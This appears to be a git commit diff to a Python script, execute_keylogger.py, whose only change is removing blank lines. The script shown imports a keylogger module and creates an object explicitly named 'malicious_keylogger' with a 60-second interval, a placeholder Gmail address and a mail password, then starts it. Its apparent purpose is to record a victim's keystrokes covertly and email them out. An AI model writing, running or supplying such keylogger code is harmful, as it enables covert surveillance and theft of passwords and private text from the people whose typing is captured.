bf32f71a9a916ec8a4a6b6a86342d211d98fa14a
lakshay1208 <76162193+lakshay1208@users.noreply.github.com>
2022-09-22 15:44:48 +0530

    Update execute_keylogger.py

--- execute_keylogger.py
+++ execute_keylogger.py
@@ -1,14 +1,7 @@
 #!/usr/bin/env python
-
 import keylogger
-
-
 # Initialize / create keylogger
 import keylogger
-
-
 malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your_mail_id@gmail.com', 'mail_password')
-
 # Execute Keylogger
-
 malicious_keylogger.start()
